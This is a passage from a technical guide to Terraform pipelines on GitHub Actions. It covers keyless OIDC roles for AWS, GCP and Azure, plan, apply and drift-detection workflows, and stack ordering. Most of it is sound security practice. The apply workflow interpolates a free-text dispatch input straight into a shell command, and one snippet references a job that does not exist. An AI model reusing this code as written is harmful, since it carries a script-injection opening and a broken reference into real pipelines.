**2. Environment gates on apply, not on plan.** The OIDC `sub` claim for a job declaring `environment: production` is `repo:org/repo:environment:production`. Bind the apply role to exactly that string and the gate becomes cryptographically enforced, not merely procedural.

**3. Concurrency matched to the state lock.** One group per stack per environment, `cancel-in-progress: false`.

**4. Saved plan vs re-plan at apply time.** The real trade-off, discussed in 48.3.

### 45.3 Repository-wide settings

```yaml
# Every Terraform workflow starts with these
permissions:
  contents: read          # minimum
  id-token: write         # required for OIDC

env:
  TF_IN_AUTOMATION: "true"        # suppresses "run terraform apply next" hints
  TF_INPUT: "false"               # never prompt
  TF_CLI_ARGS: "-no-color"
  AWS_REGION: ap-south-1
```

---

## Chapter 46 — OIDC: Keyless Authentication to AWS, GCP and Azure

### 46.1 The flow

```mermaid
sequenceDiagram
    participant J as GitHub Actions job
    participant GH as GitHub OIDC provider<br/>token.actions.githubusercontent.com
    participant STS as AWS STS
    participant TF as Terraform
    participant AWS as AWS APIs

    Note over J: permissions: id-token: write<br/>environment: production
    J->>GH: request an OIDC token, audience = sts.amazonaws.com
    GH->>GH: build the sub claim from the job context
    GH-->>J: signed JWT<br/>iss = token.actions.githubusercontent.com<br/>aud = sts.amazonaws.com<br/>sub = repo:acme/infrastructure:environment:production
    J->>STS: AssumeRoleWithWebIdentity(JWT, roleArn, sessionName)
    STS->>GH: fetch the JWKS, verify the signature
    STS->>STS: evaluate the role's trust policy against the claims
    alt claims match
        STS-->>J: temporary credentials, valid 1 hour
        J->>TF: terraform apply
        TF->>AWS: API calls with those credentials
    else claims do not match
        STS-->>J: AccessDenied
    end
```

### 46.2 How GitHub builds the `sub` claim

The default `sub` is determined in this order of precedence:

| Job context | `sub` value |
|---|---|
| Job declares `environment:` | `repo:OWNER/REPO:environment:NAME` |
| Otherwise, `pull_request` event | `repo:OWNER/REPO:pull_request` |
| Otherwise | `repo:OWNER/REPO:ref:refs/heads/BRANCH` |

🧠 **The environment claim takes precedence over everything.** This is what makes the whole design work: a job cannot obtain an `environment:production` subject without declaring `environment: production`, which triggers GitHub's protection rules.

⚠️ **AWS supports conditioning only on `aud` and `sub`.** You cannot write a trust policy condition on `job_workflow_ref` or `repository` unless you first customise the subject claim:

```bash
gh api --method PUT /repos/acme/infrastructure/actions/oidc/customization/sub \
  -f use_default=false \
  -f 'include_claim_keys[]=repo' \
  -f 'include_claim_keys[]=context' \
  -f 'include_claim_keys[]=job_workflow_ref'
```

⚠️⚠️ **The 2026 immutable subject format.** Repositories **created, renamed or transferred after 15 July 2026** use a `sub` containing numeric IDs:

```
repo:acme@1234567/infrastructure@89012345:environment:production
```

A trust policy written as `repo:acme/infrastructure:environment:production` **will not match** on such a repository, and the failure mode is a bare `AccessDenied` with no explanation.

**Recommendation: write a policy that accepts both forms explicitly**, rather than using a broad wildcard:

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
    },
    "ForAnyValue:StringEquals": {
      "token.actions.githubusercontent.com:sub": [
        "repo:acme/infrastructure:environment:production",
        "repo:acme@1234567/infrastructure@89012345:environment:production"
      ]
    }
  }
}
```

Find your numeric IDs with:

```bash
gh api /repos/acme/infrastructure --jq '{owner_id: .owner.id, repo_id: .id}'
```

### 46.3 The AWS setup, complete

```hcl
# stacks/bootstrap/oidc.tf
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  # AWS no longer validates thumbprints for GitHub's provider, but the
  # argument is still required by the API. This value is the long-standing one.
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]

  tags = local.common_tags

  lifecycle { prevent_destroy = true }
}

locals {
  repo      = "acme/infrastructure"
  repo_imm  = "acme@${var.github_owner_id}/infrastructure@${var.github_repo_id}"
}

# --- PLAN role ---
data "aws_iam_policy_document" "plan_trust" {
  statement {
    effect  = "Allow"
    actions = ["sts:AssumeRoleWithWebIdentity"]

    principals {
      type        = "Federated"
      identifiers = [aws_iam_openid_connect_provider.github.arn]
    }

    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:aud"
      values   = ["sts.amazonaws.com"]
    }

    condition {
      test     = "ForAnyValue:StringEquals"
      variable = "token.actions.githubusercontent.com:sub"
      values = [
        "repo:${local.repo}:pull_request",
        "repo:${local.repo}:ref:refs/heads/main",
        "repo:${local.repo_imm}:pull_request",
        "repo:${local.repo_imm}:ref:refs/heads/main",
      ]
    }
  }
}

resource "aws_iam_role" "terraform_plan" {
  name                 = "terraform-plan"
  assume_role_policy   = data.aws_iam_policy_document.plan_trust.json
  max_session_duration = 3600
  tags                 = local.common_tags
}

# --- APPLY role, per environment ---
data "aws_iam_policy_document" "apply_trust" {
  for_each = toset(["dev", "staging", "production"])

  statement {
    effect  = "Allow"
    actions = ["sts:AssumeRoleWithWebIdentity"]

    principals {
      type        = "Federated"
      identifiers = [aws_iam_openid_connect_provider.github.arn]
    }

    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:aud"
      values   = ["sts.amazonaws.com"]
    }

    # ⚠️ EXACT match on the environment claim. No wildcards.
    condition {
      test     = "ForAnyValue:StringEquals"
      variable = "token.actions.githubusercontent.com:sub"
      values = [
        "repo:${local.repo}:environment:${each.key}",
        "repo:${local.repo_imm}:environment:${each.key}",
      ]
    }
  }
}

resource "aws_iam_role" "terraform_apply" {
  for_each = toset(["dev", "staging", "production"])

  name                 = "terraform-apply-${each.key}"
  assume_role_policy   = data.aws_iam_policy_document.apply_trust[each.key].json
  max_session_duration = 3600
  permissions_boundary = aws_iam_policy.terraform_boundary.arn
  tags                 = local.common_tags
}
```

### 46.4 GCP

```hcl
resource "google_iam_workload_identity_pool_provider" "github" {
  workload_identity_pool_id          = google_iam_workload_identity_pool.github.workload_identity_pool_id
  workload_identity_pool_provider_id = "github-provider"
  project                            = var.project_id

  oidc { issuer_uri = "https://token.actions.githubusercontent.com" }

  attribute_mapping = {
    "google.subject"        = "assertion.sub"
    "attribute.repository"  = "assertion.repository"
    "attribute.environment" = "assertion.environment"
    "attribute.ref"         = "assertion.ref"
  }

  # ⚠️ MANDATORY. Without this, any GitHub repo on earth can authenticate.
  attribute_condition = "assertion.repository == 'acme/infrastructure'"
}

# Apply permissions bound to the production environment attribute
resource "google_service_account_iam_member" "apply_production" {
  service_account_id = google_service_account.terraform_apply.name
  role               = "roles/iam.workloadIdentityUser"
  member             = "principalSet://iam.googleapis.com/${google_iam_workload_identity_pool.github.name}/attribute.environment/production"
}

# Plan permissions bound to the repository, read-only service account
resource "google_service_account_iam_member" "plan" {
  service_account_id = google_service_account.terraform_plan.name
  role               = "roles/iam.workloadIdentityUser"
  member             = "principalSet://iam.googleapis.com/${google_iam_workload_identity_pool.github.name}/attribute.repository/acme/infrastructure"
}
```

### 46.5 Azure, briefly

```hcl
resource "azuread_application_federated_identity_credential" "apply" {
  application_id = azuread_application.terraform.id
  display_name   = "github-production"
  audiences      = ["api://AzureADTokenExchange"]
  issuer         = "https://token.actions.githubusercontent.com"
  subject        = "repo:acme/infrastructure:environment:production"
}
```

```yaml
- uses: azure/login@v2
  with:
    client-id: ${{ vars.AZURE_CLIENT_ID }}
    tenant-id: ${{ vars.AZURE_TENANT_ID }}
    subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
```

*(Azure coverage is directional — verify against current docs.)*

---

## Chapter 47 — The PR Plan Workflow

```yaml
# .github/workflows/terraform-plan.yml
name: Terraform Plan

on:
  pull_request:
    paths:
      - 'stacks/**'
      - 'modules/**'
      - 'policies/**'
      - '.github/workflows/terraform-*.yml'

permissions:
  contents: read
  id-token: write
  pull-requests: write

concurrency:
  group: tf-plan-${{ github.event.pull_request.number }}
  cancel-in-progress: true        # ✅ fine for plan; never for apply

env:
  TF_IN_AUTOMATION: "true"
  TF_INPUT: "false"
  AWS_REGION: ap-south-1
  TF_VERSION: "1.16.4"

jobs:
  # ---------------------------------------------------------------
  # 1. Work out which stacks actually changed
  # ---------------------------------------------------------------
  discover:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    outputs:
      stacks: ${{ steps.find.outputs.stacks }}
      any: ${{ steps.find.outputs.any }}
    steps:
      - uses: actions/checkout@v5
        with: { fetch-depth: 0 }

      - id: find
        run: |
          set -euo pipefail
          BASE="${{ github.event.pull_request.base.sha }}"
          HEAD="${{ github.sha }}"
          CHANGED="$(git diff --name-only "$BASE" "$HEAD")"

          # A change under modules/ or policies/ affects every stack
          if grep -qE '^(modules|policies)/' <<< "$CHANGED"; then
            STACKS="$(find stacks -name 'terraform.tf' -printf '%h\n' | sort -u | jq -R -s -c 'split("\n") | map(select(length>0))')"
          else
            STACKS="$(grep '^stacks/' <<< "$CHANGED" \
              | while read -r f; do
                  d="$(dirname "$f")"
                  while [ "$d" != "." ] && [ ! -f "$d/terraform.tf" ]; do d="$(dirname "$d")"; done
                  [ -f "$d/terraform.tf" ] && echo "$d"
                done | sort -u | jq -R -s -c 'split("\n") | map(select(length>0))')"
          fi

          STACKS="${STACKS:-[]}"
          echo "stacks=$STACKS" >> "$GITHUB_OUTPUT"
          [ "$STACKS" = "[]" ] && echo "any=false" >> "$GITHUB_OUTPUT" || echo "any=true" >> "$GITHUB_OUTPUT"
          echo "Stacks to plan: $STACKS"

  # ---------------------------------------------------------------
  # 2. Static checks — no cloud credentials needed
  # ---------------------------------------------------------------
  lint:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v5

      - uses: hashicorp/setup-terraform@v4
        with:
          terraform_version: ${{ env.TF_VERSION }}
          terraform_wrapper: false      # ⚠️ the wrapper mangles exit codes and stdout

      - name: terraform fmt
        run: terraform fmt -check -recursive -diff

      - uses: terraform-linters/setup-tflint@v5
        with: { tflint_version: v0.64.0 }

      - run: tflint --init
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: tflint
        run: tflint --recursive --format compact

  # ---------------------------------------------------------------
  # 3. Plan each changed stack
  # ---------------------------------------------------------------
  plan:
    needs: [discover, lint]
    if: needs.discover.outputs.any == 'true'
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    strategy:
      fail-fast: false
      matrix:
        stack: ${{ fromJSON(needs.discover.outputs.stacks) }}
    defaults:
      run:
        working-directory: ${{ matrix.stack }}
    steps:
      - uses: actions/checkout@v5

      - uses: hashicorp/setup-terraform@v4
        with:
          terraform_version: ${{ env.TF_VERSION }}
          terraform_wrapper: false

      # ✅ READ-ONLY role. A malicious PR can obtain nothing more than this.
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/terraform-plan
          aws-region: ${{ env.AWS_REGION }}
          role-session-name: tf-plan-${{ github.actor }}-${{ github.run_id }}

      - name: Cache providers
        uses: actions/cache@v4
        with:
          path: ${{ matrix.stack }}/.terraform/providers
          key: tf-providers-${{ runner.os }}-${{ hashFiles(format('{0}/.terraform.lock.hcl', matrix.stack)) }}
          restore-keys: tf-providers-${{ runner.os }}-

      - run: terraform init -input=false -lock-timeout=5m

      - name: terraform validate
        run: terraform validate

      - name: terraform plan
        id: plan
        run: |
          set -o pipefail
          terraform plan -input=false -lock-timeout=10m \
            -out=tfplan -detailed-exitcode 2>&1 | tee plan.txt
          echo "exitcode=${PIPESTATUS[0]}" >> "$GITHUB_OUTPUT"
        continue-on-error: true

      - name: Fail on plan error
        if: steps.plan.outputs.exitcode == '1'
        run: exit 1

      - name: Render plan JSON
        run: terraform show -json tfplan > plan.json

      - name: Upload the plan artifact
        uses: actions/upload-artifact@v4
        with:
          # ⚠️ The plan file contains full planned state, including secret values.
          # Short retention; repo-read-access only.
          name: tfplan-${{ strategy.job-index }}
          path: |
            ${{ matrix.stack }}/tfplan
            ${{ matrix.stack }}/plan.json
          retention-days: 5

      # ---------- Policy gates ----------
      - name: Checkov
        uses: bridgecrewio/checkov-action@v12
        with:
          file: ${{ matrix.stack }}/plan.json
          framework: terraform_plan
          config_file: .checkov.yml
          output_format: cli
          soft_fail: false

      - name: Conftest
        run: |
          curl -sSL https://github.com/open-policy-agent/conftest/releases/download/v0.70.1/conftest_0.70.1_Linux_x86_64.tar.gz | tar xz
          ./conftest test --policy "$GITHUB_WORKSPACE/policies" --all-namespaces plan.json

      - name: Infracost
        uses: infracost/actions/setup@v4
        with: { api-key: ${{ secrets.INFRACOST_API_KEY }} }

      - name: Infracost diff
        run: |
          infracost breakdown --path plan.json --format json --out-file infracost.json
          infracost output --path infracost.json --format github-comment --out-file infracost.md

      # ---------- Summarise and comment ----------
      - name: Build the summary
        if: always()
        run: |
          set -euo pipefail
          {
            echo "## \`${{ matrix.stack }}\`"
            echo ""
            if [ "${{ steps.plan.outputs.exitcode }}" = "0" ]; then
              echo "✅ **No changes.**"
            else
              ADD=$(jq '[.resource_changes[]? | select(.change.actions[0]=="create")] | length' plan.json)
              CHG=$(jq '[.resource_changes[]? | select(.change.actions[0]=="update")] | length' plan.json)
              DEL=$(jq '[.resource_changes[]? | select(.change.actions | contains(["delete"]))] | length' plan.json)
              REP=$(jq '[.resource_changes[]? | select(.change.actions == ["delete","create"] or .change.actions == ["create","delete"])] | length' plan.json)

              echo "| Add | Change | Destroy | **Replace** |"
              echo "|---:|---:|---:|---:|"
              echo "| $ADD | $CHG | $DEL | **$REP** |"
              echo ""

              if [ "$REP" -gt 0 ]; then
                echo "### ⚠️ Resources that will be REPLACED"
                echo ""
                jq -r '.resource_changes[]? | select(.change.actions == ["delete","create"] or .change.actions == ["create","delete"]) | "- `\(.address)`"' plan.json
                echo ""
              fi

              if [ "$DEL" -gt 0 ]; then
                echo "### 🔴 Resources that will be DESTROYED"
                echo ""
                jq -r '.resource_changes[]? | select(.change.actions | contains(["delete"])) | "- `\(.address)`"' plan.json
                echo ""
              fi

              echo "<details><summary>Full plan</summary>"
              echo ""
              echo '```terraform'
              # ⚠️ Truncate — GitHub comments cap at 65536 characters
              tail -c 50000 plan.txt
              echo '```'
              echo ""
              echo "</details>"
            fi
            echo ""
            cat infracost.md 2>/dev/null || true
          } > summary.md

          cat summary.md >> "$GITHUB_STEP_SUMMARY"

      - name: Comment on the PR
        if: always()
        uses: actions/github-script@v8
        env:
          STACK: ${{ matrix.stack }}
        with:
          script: |
            const fs = require('fs');
            const stack = process.env.STACK;
            const marker = `<!-- tfplan:${stack} -->`;
            let body = marker + "\n" + fs.readFileSync(`${stack}/summary.md`, 'utf8');
            if (body.length > 65000) body = body.slice(0, 65000) + "\n\n_...truncated. See the run log._";

            const { data: comments } = await github.rest.issues.listComments({
              ...context.repo, issue_number: context.issue.number, per_page: 100
            });
            const prev = comments.find(c => c.body?.startsWith(marker));
            if (prev) {
              await github.rest.issues.updateComment({ ...context.repo, comment_id: prev.id, body });
            } else {
              await github.rest.issues.createComment({ ...context.repo, issue_number: context.issue.number, body });
            }

  # ---------------------------------------------------------------
  # 4. A single required status check
  # ---------------------------------------------------------------
  gate:
    name: Terraform Gate
    if: always()
    needs: [discover, lint, plan]
    runs-on: ubuntu-24.04
    steps:
      - name: Fail if anything failed
        if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
        run: |
          echo "::error::One or more Terraform checks failed"
          exit 1
      - run: echo "All Terraform checks passed."
```

### 47.1 Design decisions explained

**`terraform_wrapper: false`.** The `setup-terraform` action installs a wrapper that captures stdout/stderr into step outputs. It interferes with `tee`, with `-detailed-exitcode`, and with `PIPESTATUS`. Turn it off and handle output yourself.

**`-detailed-exitcode`.** Returns 0 (no changes), 1 (error), 2 (changes). Lets you distinguish "nothing to do" from "failed" from "has changes", which drives the comment content.

**`continue-on-error` on the plan step, then an explicit failure check.** Without this, exit code 2 — which just means "there are changes" — would fail the job.

**One comment per stack, updated in place.** The `<!-- tfplan:stack -->` marker means a push updates the existing comment instead of adding another. On a PR with five pushes and three stacks, this is the difference between 3 comments and 15.

**The replace/destroy summary above the fold.** ⚠️ **This is the single most valuable part of the whole workflow.** Reviewers do not read a 4,000-line plan. They do read a table saying `Replace: 1` with `aws_db_instance.main` named underneath it.

**Truncating at 50,000 characters.** GitHub comments cap at 65,536. A large plan silently fails to post without this.

⚠️ **Do not post plan comments for stacks that handle secrets.** The plan output contains argument values. For a stack managing Secrets Manager versions, post only the counts and link to the run log.

### 47.2 `-refresh=false` on PR plans?

| | Default (refresh) | `-refresh=false` |
|---|---|---|
| Speed | Slower — one API call per resource | Much faster on large stacks |
| Accuracy | Detects drift | ⚠️ Misses drift entirely |
| Needs state write access | ✅ Yes (refresh writes back) | ❌ No — genuinely read-only |
| Takes the lock | Yes | Yes |

**Recommendation:** keep the refresh on PR plans. Missing drift in a PR plan means a reviewer approves a plan that does not reflect what apply will do. Use `-refresh=false` only for very large stacks where plan time is genuinely blocking, and pair it with nightly drift detection (Chapter 49).

---

## Chapter 48 — The Apply Workflow

```yaml
# .github/workflows/terraform-apply.yml
name: Terraform Apply

on:
  push:
    branches: [main]
    paths:
      - 'stacks/**'
      - 'modules/**'
  workflow_dispatch:
    inputs:
      stack:
        description: 'Stack path, e.g. stacks/apps/api/production'
        type: string
        required: true
      confirm:
        description: "Type the environment name to confirm"
        type: string
        required: true

permissions:
  contents: read
  id-token: write

env:
  TF_IN_AUTOMATION: "true"
  TF_INPUT: "false"
  AWS_REGION: ap-south-1
  TF_VERSION: "1.16.4"

jobs:
  discover:
    runs-on: ubuntu-24.04
    outputs:
      stacks: ${{ steps.find.outputs.stacks }}
      any: ${{ steps.find.outputs.any }}
    steps:
      - uses: actions/checkout@v5
        with: { fetch-depth: 0 }
      - id: find
        run: |
          set -euo pipefail
          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
            STACKS="$(jq -c -n --arg s '${{ inputs.stack }}' '[$s]')"
          else
            CHANGED="$(git diff --name-only '${{ github.event.before }}' '${{ github.sha }}')"
            if grep -qE '^modules/' <<< "$CHANGED"; then
              STACKS="$(find stacks -name terraform.tf -printf '%h\n' | sort -u | jq -R -s -c 'split("\n")|map(select(length>0))')"
            else
              STACKS="$(grep '^stacks/' <<< "$CHANGED" | while read -r f; do
                  d="$(dirname "$f")"
                  while [ "$d" != "." ] && [ ! -f "$d/terraform.tf" ]; do d="$(dirname "$d")"; done
                  [ -f "$d/terraform.tf" ] && echo "$d"
                done | sort -u | jq -R -s -c 'split("\n")|map(select(length>0))')"
            fi
          fi
          STACKS="${STACKS:-[]}"
          echo "stacks=$STACKS" >> "$GITHUB_OUTPUT"
          [ "$STACKS" = "[]" ] && echo "any=false" >> "$GITHUB_OUTPUT" || echo "any=true" >> "$GITHUB_OUTPUT"

  apply:
    needs: discover
    if: needs.discover.outputs.any == 'true'
    runs-on: ubuntu-24.04
    timeout-minutes: 60
    strategy:
      # ⚠️ Sequential. Foundation must apply before the apps that depend on it,
      # and a foundation failure must stop everything downstream.
      max-parallel: 1
      fail-fast: true
      matrix:
        stack: ${{ fromJSON(needs.discover.outputs.stacks) }}

    # ⏸ THE GATE. GitHub blocks the job here until reviewers approve.
    # It is ALSO what produces the environment claim in the OIDC token.
    environment: ${{ contains(matrix.stack, 'production') && 'production' || contains(matrix.stack, 'staging') && 'staging' || 'dev' }}

    concurrency:
      group: tf-apply-${{ matrix.stack }}
      cancel-in-progress: false      # ⚠️⚠️ NEVER true — cancelling mid-apply corrupts state

    defaults:
      run:
        working-directory: ${{ matrix.stack }}

    steps:
      - uses: actions/checkout@v5

      - uses: hashicorp/setup-terraform@v4
        with:
          terraform_version: ${{ env.TF_VERSION }}
          terraform_wrapper: false

      - name: Resolve the environment
        id: env
        run: |
          case "${{ matrix.stack }}" in
            *production*) echo "name=production" >> "$GITHUB_OUTPUT" ;;
            *staging*)    echo "name=staging"    >> "$GITHUB_OUTPUT" ;;
            *)            echo "name=dev"        >> "$GITHUB_OUTPUT" ;;
          esac

      # ✅ WRITE role. Obtainable only because this job declares an environment.
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/terraform-apply-${{ steps.env.outputs.name }}
          aws-region: ${{ env.AWS_REGION }}
          role-session-name: tf-apply-${{ github.actor }}-${{ github.run_id }}

      - run: terraform init -input=false -lock-timeout=5m

      # Re-plan at apply time. See 48.3 for why.
      - name: Plan
        id: plan
        run: |
          set -o pipefail
          terraform plan -input=false -lock-timeout=10m -out=tfplan -detailed-exitcode 2>&1 | tee plan.txt
          echo "exitcode=${PIPESTATUS[0]}" >> "$GITHUB_OUTPUT"
        continue-on-error: true

      - name: Fail on plan error
        if: steps.plan.outputs.exitcode == '1'
        run: exit 1

      - name: Skip if nothing to do
        if: steps.plan.outputs.exitcode == '0'
        run: echo "No changes. Skipping apply."

      - name: Re-run the policy gate against the apply-time plan
        if: steps.plan.outputs.exitcode == '2'
        run: |
          terraform show -json tfplan > plan.json
          curl -sSL https://github.com/open-policy-agent/conftest/releases/download/v0.70.1/conftest_0.70.1_Linux_x86_64.tar.gz | tar xz
          ./conftest test --policy "$GITHUB_WORKSPACE/policies" --all-namespaces plan.json

      - name: Apply
        if: steps.plan.outputs.exitcode == '2'
        run: terraform apply -input=false -lock-timeout=10m tfplan

      - name: Outputs
        if: always()
        run: |
          {
            echo "## Applied: \`${{ matrix.stack }}\`"
            echo ""
            echo "| Field | Value |"
            echo "|---|---|"
            echo "| Environment | ${{ steps.env.outputs.name }} |"
            echo "| Commit | \`${{ github.sha }}\` |"
            echo "| Actor | @${{ github.actor }} |"
            echo "| Result | ${{ job.status }} |"
            echo ""
            echo '<details><summary>Outputs</summary>'
            echo ""
            echo '```json'
            terraform output -json 2>/dev/null | jq 'map_values(if .sensitive then "***" else .value end)' || echo '{}'
            echo '```'
            echo ""
            echo '</details>'
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Notify Slack
        if: always()
        uses: slackapi/slack-github-action@v2
        with:
          webhook: ${{ secrets.SLACK_INFRA_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            text: "${{ job.status == 'success' && '✅' || '🔴' }} Terraform apply `${{ matrix.stack }}` — ${{ job.status }} (by @${{ github.actor }})\n${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
```

### 48.1 Environment protection rules

Configure in **Settings → Environments → production**:

- [ ] **Required reviewers** — the platform team. The job pauses until someone approves.
- [ ] **Deployment branches and tags** — restrict to `main` only. Prevents applying production from a feature branch.
- [ ] **Wait timer** — optional; useful for a bake period between staging and production.
- [ ] **Environment secrets and variables** — `AWS_ACCOUNT_ID` per environment.

🧠 **The branch restriction is doing real security work**, not just process. Without it, someone could push a branch declaring `environment: production`, obtain the production OIDC claim, and apply.

### 48.2 `terraform output -json` and sensitivity

⚠️ `terraform output -json` prints sensitive values **unredacted** — unlike `terraform output` without `-json`. The `jq 'map_values(if .sensitive then "***" ...)'` filter above is not optional.

### 48.3 Saved plan vs re-plan: the honest trade-off

```mermaid
flowchart TD
    subgraph SAVED["Apply the plan saved at PR time"]
        S1["✅ Applies EXACTLY what was reviewed"]
        S2["✅ No surprises between review and apply"]
        S3["⚠️ Plan may be hours old"]
        S4["⚠️ Fails with 'Saved plan is stale' if state changed"]
        S5["⚠️ Needs artifact passing across workflows"]
        S6["⚠️ Plan artifacts contain secrets"]
    end
    subgraph REPLAN["Re-plan at apply time"]
        R1["✅ Always current"]
        R2["✅ Simpler pipeline"]
        R3["✅ No secret-bearing artifacts"]
        R4["⚠️ Applies something slightly different<br/>from what was reviewed"]
        R5["⚠️ Drift since the review is applied<br/>without a human seeing it"]
    end
```

**The stale-plan mechanism:** a saved plan records the state `serial`. If state has changed since, `terraform apply tfplan` refuses with `Saved plan is stale`. This is a genuine safety property — but in practice it fires often, because any other apply, or even a plan that refreshed drift, bumps the serial.

**Recommendation for a small team: re-plan at apply time**, as shown in the workflow, **and re-run the policy gate against the apply-time plan**. You get currency and simplicity, and the policy gate catches anything that changed between review and apply. Add a diff check if you want extra assurance:

```yaml
- name: Warn if the plan changed since the PR
  run: |
    ADD_NOW=$(jq '[.resource_changes[]?|select(.change.actions[0]=="create")]|length' plan.json)
    if [ "$ADD_NOW" != "${{ needs.pr.outputs.add_count }}" ]; then
      echo "::warning::The apply-time plan differs from the reviewed plan"
    fi
```

**Use the saved plan** when you are in a regulated environment where "we applied exactly what was approved" is an auditable requirement. Accept the staleness friction as the cost.

---

## Chapter 49 — Drift Detection

```yaml
# .github/workflows/drift-detect.yml
name: Drift Detection

on:
  schedule:
    - cron: '0 2 * * *'         # 02:00 UTC daily
  workflow_dispatch:

permissions:
  contents: read
  id-token: write
  issues: write

env:
  AWS_REGION: ap-south-1
  TF_VERSION: "1.16.4"
  TF_IN_AUTOMATION: "true"

jobs:
  discover:
    runs-on: ubuntu-24.04
    outputs:
      stacks: ${{ steps.f.outputs.stacks }}
    steps:
      - uses: actions/checkout@v5
      - id: f
        run: |
          find stacks -name terraform.tf -printf '%h\n' | sort -u \
            | jq -R -s -c 'split("\n")|map(select(length>0))' \
            | xargs -I{} echo "stacks={}" >> "$GITHUB_OUTPUT"

  detect:
    needs: discover
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    strategy:
      fail-fast: false
      max-parallel: 4
      matrix:
        stack: ${{ fromJSON(needs.discover.outputs.stacks) }}
    defaults:
      run:
        working-directory: ${{ matrix.stack }}
    steps:
      - uses: actions/checkout@v5
      - uses: hashicorp/setup-terraform@v4
        with:
          terraform_version: ${{ env.TF_VERSION }}
          terraform_wrapper: false

      # ✅ READ-ONLY. Drift detection must never be able to change anything.
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/terraform-plan
          aws-region: ${{ env.AWS_REGION }}
          role-session-name: tf-drift-${{ github.run_id }}

      - run: terraform init -input=false -lock-timeout=5m

      - id: plan
        continue-on-error: true
        run: |
          set -o pipefail
          terraform plan -input=false -detailed-exitcode -lock-timeout=10m 2>&1 | tee drift.txt
          echo "exitcode=${PIPESTATUS[0]}" >> "$GITHUB_OUTPUT"

      - name: Open or update an issue on drift
        if: steps.plan.outputs.exitcode == '2'
        uses: actions/github-script@v8
        env:
          STACK: ${{ matrix.stack }}
        with:
          script: |
            const fs = require('fs');
            const stack = process.env.STACK;
            const title = `Drift detected: ${stack}`;
            const plan = fs.readFileSync(`${stack}/drift.txt`, 'utf8').slice(-40000);
            const body = [
              `Drift detected at ${new Date().toISOString()}.`,
              ``,
              `Either codify this change or investigate who made it.`,
              ``,
              `[Run](${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId})`,
              ``,
              '<details><summary>Plan</summary>',
              '',
              '```terraform',
              plan,
              '```',
              '',
              '</details>',
            ].join('\n');

            const { data: open } = await github.rest.issues.listForRepo({
              ...context.repo, state: 'open', labels: 'drift', per_page: 100
            });
            const existing = open.find(i => i.title === title);
            if (existing) {
              await github.rest.issues.createComment({ ...context.repo, issue_number: existing.number, body });
            } else {
              await github.rest.issues.create({
                ...context.repo, title, body, labels: ['drift', 'infrastructure']
              });
            }

      - name: Close the issue if drift is gone
        if: steps.plan.outputs.exitcode == '0'
        uses: actions/github-script@v8
        env:
          STACK: ${{ matrix.stack }}
        with:
          script: |
            const title = `Drift detected: ${process.env.STACK}`;
            const { data: open } = await github.rest.issues.listForRepo({
              ...context.repo, state: 'open', labels: 'drift', per_page: 100
            });
            const existing = open.find(i => i.title === title);
            if (existing) {
              await github.rest.issues.createComment({
                ...context.repo, issue_number: existing.number,
                body: 'Drift resolved. Closing.'
              });
              await github.rest.issues.update({
                ...context.repo, issue_number: existing.number, state: 'closed'
              });
            }
```

🧠 **The auto-close is what makes this sustainable.** A drift workflow that only opens issues produces a graveyard nobody reads. One that closes them when resolved stays trustworthy.

⚠️ Drift detection **takes the state lock** during plan. Schedule it away from your busiest deploy windows, and keep `max-parallel` modest.

---

## Chapter 50 — Monorepo Path Filtering and the Multi-Stack Matrix

The discovery job in Chapters 47 and 48 is the core of this. Two refinements worth adding:

### 50.1 A dependency-aware ordering

```yaml
- id: order
  run: |
    # Apply in dependency order regardless of which changed
    ORDER='["stacks/foundation","stacks/data","stacks/platform","stacks/platform-addons","stacks/apps"]'
    CHANGED='${{ steps.find.outputs.stacks }}'
    SORTED=$(jq -c --argjson order "$ORDER" '
      sort_by(
        . as $s | ($order | map(. as $p | if ($s | startswith($p)) then 1 else 0 end) | index(1)) // 99
      )
    ' <<< "$CHANGED")
    echo "stacks=$SORTED" >> "$GITHUB_OUTPUT"
```

Combined with `max-parallel: 1` and `fail-fast: true`, this gives you correct ordering with a failure stopping everything downstream.

### 50.2 A declarative stack manifest

For anything beyond a handful of stacks, a manifest beats path inference:

```yaml
# stacks.yml
stacks:
  - path: stacks/foundation/production
    environment: production
    depends_on: []
  - path: stacks/data/production
    environment: production
    depends_on: [stacks/foundation/production]
  - path: stacks/apps/api/production
    environment: production
    depends_on: [stacks/foundation/production, stacks/data/production]
```

```yaml
- id: find
  run: |
    STACKS=$(yq -o=json '.stacks' stacks.yml | jq -c '[.[] | .path]')
    echo "stacks=$STACKS" >> "$GITHUB_OUTPUT"
```

This makes dependencies explicit, testable and reviewable, rather than encoded in a bash sort.

---

## Chapter 51 — Module Release Automation

```yaml
# In the terraform-modules repo: .github/workflows/release.yml
name: Release module

on:
  push:
    tags: ['v*.*.*']

permissions:
  contents: write

jobs:
  validate:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        module: [vpc, ecs-service, rds-postgres, eks-cluster]
    defaults:
      run:
        working-directory: modules/${{ matrix.module }}
    steps:
      - uses: actions/checkout@v5
      - uses: hashicorp/setup-terraform@v4
